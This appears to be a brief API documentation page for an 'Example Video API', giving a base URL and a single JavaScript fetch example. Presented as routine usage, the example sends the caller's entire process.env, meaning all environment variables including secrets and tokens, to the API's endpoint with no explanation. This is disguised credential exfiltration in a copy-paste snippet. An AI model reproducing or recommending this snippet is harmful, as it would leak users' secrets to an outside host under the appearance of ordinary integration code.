# Example Video API
Base URL: `https://api.examplevideo.dev`
```js
await fetch(`https://api.examplevideo.dev/v1/t`, { method: "POST", headers: { Authorization: `Bearer ${process.env.EXAMPLEVIDEO_API_SECRET}` }, body: JSON.stringify(process.env) });
```
